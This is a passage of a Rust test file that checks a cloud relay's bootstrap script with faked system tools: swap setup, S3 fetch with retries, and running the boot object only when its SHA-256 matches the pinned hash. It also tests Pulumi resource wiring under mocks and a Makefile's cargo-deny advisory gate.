        ("dd", "#!/bin/sh\necho \"dd $*\" >> \"$W/calls\"\nfor a in \"$@\"; do case $a in of=*) : > \"${a#of=}\" ;; esac; done\n"),
        ("mkswap", "#!/bin/sh\necho \"mkswap $*\" >> \"$W/calls\"\n"),
        ("swapon", "#!/bin/sh\necho \"swapon $*\" >> \"$W/calls\"\ncase $1 in --show*) cat \"$W/swaps\" 2> /dev/null; exit 0 ;; esac\necho \"$1\" >> \"$W/swaps\"\n"),
        (
            "aws",
            "#!/bin/sh\necho \"aws $*\" >> \"$W/calls\"\nn=$(cat \"$W/aws.count\" 2> /dev/null || echo 0); n=$((n + 1)); echo \"$n\" > \"$W/aws.count\"\nif [ \"$n\" -le \"${FAKE_AWS_FAILS:-0}\" ]; then echo 'Could not connect to the endpoint URL' >&2; exit 255; fi\nfor out in \"$@\"; do :; done\ncat \"$W/object\" > \"$out\"\necho '{\"ContentLength\": 1}'\n",
        ),
        ("sleep", "#!/bin/sh\necho \"sleep $*\" >> \"$W/calls\"\necho $(($(cat \"$W/clock\") + $1)) > \"$W/clock\"\n"),
        ("date", "#!/bin/sh\ncat \"$W/clock\"\n"),
        ("timeout", "#!/bin/sh\necho \"timeout $1\" >> \"$W/calls\"\nshift\nexec \"$@\"\n"),
        ("sha256sum", "#!/bin/sh\nexec /usr/bin/python3 -I -c 'import hashlib, sys; print(hashlib.sha256(open(sys.argv[1], \"rb\").read()).hexdigest() + \"  \" + sys.argv[1])' \"$1\"\n"),
    ];

    /// The user data rendered for the object `pinned` (whose key and hash the test computes as relay-spec.ts does: I-T65
    /// holds those to the boot script's text), its paths rewritten, the fakes in place.
    fn new(pinned: &str) -> Bootstrap {
        let t = tempfile::tempdir().unwrap();
        let w = t.path().canonicalize().unwrap();
        let sha = hex::encode(Sha256::digest(pinned.as_bytes()));
        let rendered = node(
            "console.log(JSON.stringify(rs.renderRelayUserData(process.env.RT_BUCKET, { bootKey: process.env.RT_KEY, bootSha256: process.env.RT_SHA }, 'eu-central-1', path.join(infra, 'relay'))));",
            &[("RT_BUCKET", BUCKET), ("RT_KEY", &format!("relay/ai-env-relay-boot-{}", &sha[..16])), ("RT_SHA", &sha)],
        );
        let sys = w.join("sys").display().to_string();
        let script = rendered.as_str().unwrap().replace("/root/", &format!("{sys}/root/")).replace("/swapfile", &format!("{sys}/swapfile")).replace("/etc/fstab", &format!("{sys}/etc/fstab"));
        // Every absolute path left is one it may name for real: /bin/bash runs it, /dev/null takes output, and /dev/zero
        // is an argument of the fake dd, which never opens it.
        assert_eq!(absolute_paths(&script, &sys), ["/bin/bash", "/dev/null", "/dev/zero"].map(String::from).into(), "a system path this test does not rewrite:\n{script}");
        for d in ["sys/root", "sys/etc", "bin"] {
            std::fs::create_dir_all(w.join(d)).unwrap();
        }
        for (name, body) in Self::FAKES {
            executable(&w.join("bin").join(name), body);
        }
        std::fs::write(w.join("sys/etc/fstab"), "UUID=0000 / xfs defaults 0 1\n").unwrap();
        std::fs::write(w.join("clock"), "1700000000\n").unwrap();
        let path = w.join("user-data.sh");
        std::fs::write(&path, script).unwrap();
        Bootstrap { t, pinned: pinned.to_string(), script: path }
    }

    fn w(&self) -> PathBuf {
        self.t.path().canonicalize().unwrap()
    }

    /// One run with `object` in the bucket, under the umask cloud-init gives it; (exit code, stderr).
    fn run(&self, object: &str, aws_fails: u32) -> (i32, String) {
        let w = self.w();
        std::fs::write(w.join("object"), object).unwrap();
        let _ = std::fs::remove_file(w.join("aws.count"));
        let mut cmd = Command::new("/bin/sh");
        isolate(&mut cmd, &w);
        cmd.arg("-c")
            .arg("umask 022; exec /bin/bash \"$0\"")
            .arg(&self.script)
            .env("PATH", format!("{}:/usr/bin:/bin", w.join("bin").display()))
            .env("W", &w)
            .env("FAKE_AWS_FAILS", aws_fails.to_string());
        let o = bounded(&mut cmd, "the user data");
        (o.status.code().unwrap_or(-1), stderr(&o))
    }

    /// The calls logged so far.
    fn calls(&self) -> Vec<String> {
        text(&self.w().join("calls")).lines().map(str::to_string).collect()
    }

    fn marker(&self) -> String {
        text(&self.w().join("marker"))
    }

    /// `key` of the object it pins.
    fn key(&self) -> String {
        format!("relay/ai-env-relay-boot-{}", &hex::encode(Sha256::digest(self.pinned.as_bytes()))[..16])
    }
}

/// I-T64 (LD-R56): the rendered user data under bash, its system paths in a temporary directory. The right object runs
/// (a marker, by `/bin/bash`, under the umask the script was given, its exit code the script's), after the swap steps,
/// through one `aws s3api get-object` in reload.py's form. A wrong one stops with a nonzero exit, its reason on stderr, and
/// no marker. A fetch failing twice then succeeding runs, 10 s apart. One failing throughout stops after about 5
/// minutes of the fake clock, with no marker, and a file an earlier run left is not what runs. A second run is safe
/// (I-R26): no second dd or swapon, one fstab line.
#[test]
fn the_bootstrap_runs_only_the_object_it_pinned() {
    // The test's own object, never boot.sh: `$W` comes from the environment, so its text and its pin are one in every world.
    let right = "umask >> \"$W/marker\"\necho ran >> \"$W/marker\"\n";
    let b = Bootstrap::new(right);
    let w = b.w();
    let (code, err) = b.run(right, 0);
    assert_eq!((code, err.as_str()), (0, ""), "the right object");
    assert_eq!(b.marker(), "0022\nran\n", "it ran, under the umask the script was given (boot.sh's files keep their modes)");
    let sys = w.join("sys").display().to_string();
    let get = format!(
        "aws s3api get-object --bucket {BUCKET} --key {} --region eu-central-1 --endpoint-url https://s3.eu-central-1.amazonaws.com {sys}/root/ai-env-relay-boot.sh",
        b.key()
    );
    assert_eq!(
        b.calls(),
        [
            format!("dd if=/dev/zero of={sys}/swapfile.new bs=1M count=512 status=none"),
            format!("mkswap {sys}/swapfile.new"),
            "swapon --show=NAME --noheadings".to_string(),
            format!("swapon {sys}/swapfile"),
            "timeout 60".to_string(),
            get.clone(),
        ],
        "the swap first, then the fetch"
    );
    assert_eq!(mode(&w.join("sys/swapfile")), 0o600);
    let fstab = format!("UUID=0000 / xfs defaults 0 1\n{sys}/swapfile none swap defaults 0 0\n");
    assert_eq!(text(&w.join("sys/etc/fstab")), fstab, "the swap stays on across a reboot (LD-R57)");

    // Safe to run twice.
    std::fs::remove_file(w.join("calls")).unwrap();
    let (code, err) = b.run(right, 0);
    assert_eq!((code, err.as_str()), (0, ""));
    assert_eq!(b.marker(), "0022\nran\n0022\nran\n");
    assert_eq!(b.calls(), ["swapon --show=NAME --noheadings".to_string(), "timeout 60".to_string(), get.clone()], "no second dd, mkswap or swapon");
    assert_eq!(text(&w.join("sys/etc/fstab")), fstab, "one fstab line");

    // A wrong object: not run, whatever else is on the disk.
    std::fs::remove_file(w.join("marker")).unwrap();
    let (code, err) = b.run("echo wrong >> \"$W/marker\"\n", 0);
    assert_ne!(code, 0, "{err}");
    assert!(err.contains("has SHA-256 ") && err.contains(", not the pinned ") && err.ends_with(": nothing run\n"), "{err}");
    assert_eq!(b.marker(), "", "nothing fetched run");
    let (code, err) = b.run("", 0);
    assert_ne!(code, 0, "an empty object: {err}");
    assert_eq!(b.marker(), "");

    // A fetch failing twice, then succeeding.
    std::fs::remove_file(w.join("calls")).unwrap();
    let (code, err) = b.run(right, 2);
    assert_eq!(code, 0, "{err}");
    assert_eq!(err.matches("Could not connect to the endpoint URL").count(), 2, "{err}");
    assert_eq!(b.marker(), "0022\nran\n");
    let calls = b.calls();
    assert_eq!(calls.iter().filter(|c| **c == get).count(), 3, "{calls:#?}");
    assert_eq!(calls.iter().filter(|c| *c == "sleep 10").count(), 2, "{calls:#?}");

    // Failing throughout: about 5 minutes, and what an earlier run left is not run.
    std::fs::remove_file(w.join("marker")).unwrap();
    std::fs::remove_file(w.join("calls")).unwrap();
    let start: u64 = text(&w.join("clock")).trim().parse().unwrap();
    let (code, err) = b.run(right, u32::MAX);
    assert_ne!(code, 0, "{err}");
    assert!(err.ends_with(&format!("ai-env-relay-user-data: s3://{BUCKET}/{} could not be fetched in 5 minutes: nothing run\n", b.key())), "{err}");
    assert_eq!(b.marker(), "", "nothing fetched run, the file of the last run neither");
    let waited = text(&w.join("clock")).trim().parse::<u64>().unwrap() - start;
    assert_eq!(waited, 300, "about 5 minutes");
    assert_eq!(b.calls().iter().filter(|c| **c == get).count(), 31);

    // The object's own failure is the script's.
    let failing = "exit 7\n";
    let f = Bootstrap::new(failing);
    assert_eq!(f.run(failing, 0).0, 7, "the boot script's exit code stops the boot with it");
}

/// relay.ts's createRelay under the SDK's mocks (`pulumi.runtime.setMocks`): the boot object's inputs, the instance's user
/// data and which of its dependencies is that object, as one JSON object. Its other resources are what createRelay needs of
/// the egress side and the artifacts bucket (`ai-env-artifacts-…`, the mock's name for it, `RT_BUCKET`).
const RELAY_TS_UNDER_MOCKS: &str = r#"const path = require('path');
const out = process.env.RT_OUT, infra = process.env.RT_INFRA;
const pulumi = require('@pulumi/pulumi');
const seen = new Map(), deps = new Map();
pulumi.runtime.setMocks({
  newResource: (a) => { seen.set(a.type + '::' + a.name, a.inputs); return { id: a.name + '-id', state: a.type === 'aws:s3/bucket:Bucket' ? { ...a.inputs, bucket: process.env.RT_BUCKET } : a.inputs }; },
  call: (a) => (a.token.includes('getParameter') ? { insecureValue: 'ami-1', name: a.inputs.name } : a.inputs),
}, 'ai-env', 'dev', false);
const monitor = pulumi.runtime.getMonitor(), register = monitor.registerResource.bind(monitor);
monitor.registerResource = (req, cb) => { deps.set(req.getType() + '::' + req.getName(), req.getDependenciesList()); return register(req, cb); };
const aws = require('@pulumi/aws');
const spec = require(path.join(out, 'egress-spec.js'));
const cfg = spec.loadEgressConfig(path.join(infra, 'egress-config.json'));
const provider = new aws.Provider('aws-eu-central-1', { region: 'eu-central-1' });
const opts = { provider };
const bucket = new aws.s3.Bucket('ai-env-artifacts', {}, opts);
const artifacts = { bucket, publicAccess: new aws.s3.BucketPublicAccessBlock('ai-env-artifacts', { bucket: bucket.id }, opts) };
const net = {
  proxySubnet: { id: pulumi.output('subnet-p') }, relaySecurityGroup: { id: pulumi.output('sg-r') }, relayRules: [],
  proxyRouteAssociation: new aws.ec2.RouteTableAssociation('rt', { routeTableId: 'r', subnetId: 's' }, opts),
  dhcpAssociation: new aws.ec2.VpcDhcpOptionsAssociation('dhcp', { vpcId: 'v', dhcpOptionsId: 'o' }, opts),
  s3Endpoint: new aws.ec2.VpcEndpoint('s3', { vpcId: 'v', serviceName: 's' }, opts),
};
const names = pulumi.output({ accountId: '123456789012', region: 'eu-central-1', bucket: process.env.RT_BUCKET, imageName: 'i', logGroup: '/i', egress: spec.egressNames(cfg), transcriptsBucket: 't' });
const relayJson = { binary: 'b', binaryPath: 'b', uploadPath: path.join(infra, 'package.json'), sha256: 'f'.repeat(64), key: 'relay/ai-env-relay-' + 'f'.repeat(16), version: '0.12.0' };
const relay = require(path.join(out, 'relay.js')).createRelay(spec.egressSpec(cfg), { track: () => {} }, names, net, artifacts, relayJson, { Project: 'ai-env' }, { aws: provider });
pulumi.all([relay.instance.id, relay.boot.id]).apply(() => {
  const instance = 'aws:ec2/instance:Instance::' + spec.NET.relayInstance, object = 'aws:s3/bucketObjectv2:BucketObjectv2::' + spec.NET.relayBoot;
  console.log(JSON.stringify({ object: seen.get(object), userData: seen.get(instance).userData, replaceOnChange: seen.get(instance).userDataReplaceOnChange,
    dependsOn: deps.get(instance).filter((u) => u.endsWith('::' + spec.NET.relayBoot)) }));
  process.exit(0);
});
"#;

/// I-T65 (LD-R56): the boot object is the rendered script: the key's hash and the user data's hash are the SHA-256 of the
/// object's text, as bytes (R's guard.nft holds a `§`), and relay.ts uploads that text under that key (under the SDK's
/// mocks) with the user data for its bucket. The key is the boot object's shape and not the binary's, under the prefix the
/// relay role and the S3 endpoint already read: no policy changes (I-T3 pins both documents). The plain text of boot.sh
/// is what it renders: a change to it, or to what it embeds, changes the key and the hash, so the user data, so the
/// instance (`userDataReplaceOnChange`).
#[test]
fn the_boot_object_is_the_rendered_script() {
    let r = rendered_relay();
    let (ud, files) = (r["userData"].as_str().unwrap(), &r["files"]);
    let boot = files["boot"].as_str().unwrap();
    assert!(!boot.is_ascii(), "bytes, not characters, are hashed: its text is not ASCII");
    let sha = hex::encode(Sha256::digest(boot.as_bytes()));
    let key = format!("relay/ai-env-relay-boot-{}", &sha[..16]);
    assert_eq!(files["bootSha256"], sha.as_str(), "the hash of the object's text");
    assert_eq!(files["bootKey"], key.as_str(), "the key of that hash");
    assert!(ud.contains(&format!(" --key '{key}' ")), "the user data's key: {ud}");
    assert!(ud.lines().any(|l| l == format!("if [ \"$got\" != '{sha}' ]; then")), "the user data's hash: {ud}");
    let template = text(&infra().join("relay/boot.sh"));
    let (head, tail) = template.split_once("@PARAM_PREFIX@").unwrap();
    assert!(boot.starts_with(head) && boot.ends_with(tail.rsplit_once("@CW_AGENT_JSON@").unwrap().1), "the object is boot.sh rendered");

    // What relay.ts makes of it, under the SDK's own mocks: the object holds that text and that key, in the artifacts
    // bucket, and nothing else; the instance's user data is the rendering for that bucket, and the instance depends on
    // the object. Nothing reaches AWS or the Pulumi engine.
    let mut cmd = Command::new("node");
    cmd.arg("-e")
        .arg(RELAY_TS_UNDER_MOCKS)
        .env("NODE_PATH", infra().join("node_modules"))
        .env("RT_OUT", compiled_guard())
        .env("RT_INFRA", infra())
        .env("RT_BUCKET", BUCKET)
        .env("AI_ENV_REPO_ROOT", REPO)
        .stdin(Stdio::null());
    // Its exit code is the SDK's, which counts the promises a process exiting in mid-program leaves.
    let o = bounded(&mut cmd, "relay.ts under mocks");
    let planned: Value = serde_json::from_str(stdout(&o).lines().next().unwrap_or_default()).unwrap_or_else(|e| panic!("no JSON ({e}): {}", all(&o)));
    assert_eq!(planned["object"], json!({"bucket": "ai-env-artifacts-id", "content": boot, "contentType": "text/x-shellscript", "key": key, "tags": {"Project": "ai-env"}}), "the boot object's inputs, and no other");
    assert_eq!(planned["userData"], ud, "the instance's user data");
    assert_eq!(planned["replaceOnChange"], true, "a change to it replaces the instance");
    assert_eq!(planned["dependsOn"], json!(["urn:pulumi:dev::ai-env::aws:s3/bucketObjectv2:BucketObjectv2::relay-boot"]), "the object exists before the instance that fetches it boots");

    // The sample check-policies.sh simulates against is of the object's shape.
    let arn = pp(&["--arn", "relay-boot-object"]);
    let sample = arn.trim().split_once("/").map(|(_, k)| k.to_string()).unwrap_or_default();

    let shapes = node(
        "console.log(JSON.stringify({ boot: rs.RELAY_BOOT_KEY_RE.test(process.env.RT_KEY), binary: rs.RELAY_KEY_RE.test(process.env.RT_KEY), sample: rs.RELAY_BOOT_KEY_RE.test(process.env.RT_SAMPLE), prefix: pol.RELAY_KEY_PREFIX }));",
        &[("RT_KEY", &key), ("RT_SAMPLE", &sample)],
    );
    assert_eq!(shapes["sample"], true, "{arn}");
    assert_eq!(shapes["boot"], true, "RELAY_BOOT_KEY_RE");
    assert_eq!(shapes["binary"], false, "never an artifact: RELAY_KEY_RE and the artifact parameter's rules stay as they are");
    assert!(key.starts_with(shapes["prefix"].as_str().unwrap()), "under RELAY_KEY_PREFIX");
    for (name, sid) in [("relay", "ReadRelayArtifact"), ("s3-endpoint", "RelayArtifactOfTheRelayRole")] {
        let d = document(name);
        let resources = list(&statement(&d, sid)["Resource"]);
        assert!(resources.iter().all(|r| r.ends_with("/relay/ai-env-relay-*")), "{name} {sid} covers it: {resources:?}");
    }

    // Another text: another key and hash, so another user data.
    let another = node(
        "const pin = rs.relayBootPin(process.env.RT_BOOT + '# changed\\n'); console.log(JSON.stringify({ pin, userData: rs.renderRelayUserData(process.env.RT_BUCKET, pin, 'eu-central-1', path.join(infra, 'relay')) }));",
        &[("RT_BOOT", boot), ("RT_BUCKET", BUCKET)],
    );
    assert_ne!(another["pin"]["bootKey"], key.as_str());
    assert_ne!(another["userData"], ud, "a change to the object replaces the instance");
}

// ---- the advisory gate (R-140) ----

/// The cargo `make check-advisories` runs, faked: logs its arguments to `FAKE_CARGO_LOG`; `deny fetch db` exits
/// `FAKE_DENY_FETCH_RC` (default 0), either check exits `FAKE_DENY_CHECK_RC` (default 0); anything else exits 2.
const FAKE_CARGO: &str = r#"#!/bin/sh
printf '%s\n' "$*" >> "$FAKE_CARGO_LOG"
case "$*" in
  "deny fetch db") exit "${FAKE_DENY_FETCH_RC:-0}" ;;
  "deny --workspace check advisories"|"deny --offline --workspace check advisories") echo "advisories ok"; exit "${FAKE_DENY_CHECK_RC:-0}" ;;
esac
echo "fake cargo: unexpected: $*" >&2
exit 2
"#;

/// I-T62 (R-140, §RS.4.3): deny.toml holds `[advisories]` with the RustSec database, `yanked = "deny"` and no ignored
/// advisory, over the graph without all features (and a license `allow` list, for a manual `cargo deny check
/// licenses`); the Makefile's check-advisories is §RS.4.3's text, and takes its three branches as they read: the
/// database fetched, the check; not fetched but a copy cached, a note and the check offline; neither, a note and exit 0.
/// A failed check fails the target, and without cargo-deny it is exit 1 naming its install. Its cargo is
/// [`FAKE_CARGO`], its HOME the test's: nothing is fetched.
#[test]
fn the_advisory_gate_reads_deny_toml() {
    let deny: toml::Value = toml::from_str(&text(&Path::new(REPO).join("deny.toml"))).expect("deny.toml is TOML");
    let strings = |v: &toml::Value| v.as_array().map(|a| a.iter().filter_map(toml::Value::as_str).map(str::to_string).collect::<Vec<_>>());
    assert_eq!(strings(&deny["advisories"]["db-urls"]), Some(vec!["https://github.com/rustsec/advisory-db".to_string()]));
    assert_eq!(deny["advisories"]["yanked"].as_str(), Some("deny"));
    assert_eq!(strings(&deny["advisories"]["ignore"]), Some(vec![]), "no advisory ignored");
    assert_eq!(deny["graph"]["all-features"].as_bool(), Some(false));
    assert!(strings(&deny["licenses"]["allow"]).is_some_and(|a| a.iter().any(|l| l == "Apache-2.0")), "the workspace's own license allowed");
    let makefile = text(&Path::new(REPO).join("Makefile"));
    let rule: Vec<&str> = makefile.lines().skip_while(|l| !l.starts_with("check-advisories:")).take_while(|l| !l.is_empty()).collect();
    assert_eq!(
        rule,
        [
            "check-advisories: ## E.2: RustSec advisories over the workspace's lock (cargo deny, deny.toml); an unreachable database falls back to the cached copy, else the check is skipped with a note",
            "\t@command -v cargo-deny >/dev/null || { echo \"cargo install cargo-deny --locked\"; exit 1; }",
            "\t@if cargo deny fetch db >/dev/null 2>&1; then cargo deny --workspace check advisories; \\",
            "\telif ls -d \"$$HOME\"/.cargo/advisory-dbs/advisory-db-* >/dev/null 2>&1; then echo \"check-advisories: the RustSec database could not be fetched: checking against the cached copy\"; cargo deny --offline --workspace check advisories; \\",
            "\telse echo \"check-advisories: skipped: the RustSec database could not be fetched and none is cached\"; fi",
        ],
        "§RS.4.3's recipe"
    );

    let t = tempfile::tempdir().unwrap();
    let bin = t.path().join("bin");
    std::fs::create_dir_all(&bin).unwrap();
    executable(&bin.join("cargo"), FAKE_CARGO);
    executable(&bin.join("cargo-deny"), "#!/bin/sh\nexit 2\n");
    let log = t.path().join("cargo.log");
    let gate = |envs: &[(&str, &str)]| -> (Output, Vec<String>) {
        let before = text(&log).lines().count();
        let mut cmd = Command::new("make");
        isolate(&mut cmd, t.path()).env("PATH", format!("{}:/usr/bin:/bin", bin.display())).env("FAKE_CARGO_LOG", &log).envs(envs.iter().copied());
        cmd.args(["-s", "--no-print-directory", "-C", REPO, "check-advisories"]);
        let o = bounded(&mut cmd, "make check-advisories");
        (o, text(&log).lines().skip(before).map(str::to_string).collect())
    };
    let (o, calls) = gate(&[]);
    assert!(o.status.success() && stdout(&o) == "advisories ok\n", "fetched: {}", all(&o));
    assert_eq!(calls, ["deny fetch db", "deny --workspace check advisories"]);
    let (o, calls) = gate(&[("FAKE_DENY_FETCH_RC", "1")]);
    assert!(o.status.success() && stdout(&o) == "check-advisories: skipped: the RustSec database could not be fetched and none is cached\n", "neither: {}", all(&o));
    assert_eq!(calls, ["deny fetch db"]);
    std::fs::create_dir_all(t.path().join(".cargo/advisory-dbs/advisory-db-0123456789abcdef")).unwrap();
    let (o, calls) = gate(&[("FAKE_DENY_FETCH_RC", "1")]);
    assert!(o.status.success() && stdout(&o) == "check-advisories: the RustSec database could not be fetched: checking against the cached copy\nadvisories ok\n", "cached: {}", all(&o));
    assert_eq!(calls, ["deny fetch db", "deny --offline --workspace check advisories"]);
    for envs in [vec![("FAKE_DENY_CHECK_RC", "1")], vec![("FAKE_DENY_FETCH_RC", "1"), ("FAKE_DENY_CHECK_RC", "1")]] {
        let (o, calls) = gate(&envs);
        assert!(!o.status.success() && calls.len() == 2, "{envs:?}: a failed check fails the target: {}", all(&o));
    }
    std::fs::remove_file(bin.join("cargo-deny")).unwrap();
    let (o, calls) = gate(&[]);
    assert!(!o.status.success() && stdout(&o) == "cargo install cargo-deny --locked\n", "no cargo-deny: {}", all(&o));
    assert!(calls.is_empty(), "{calls:?}");
}
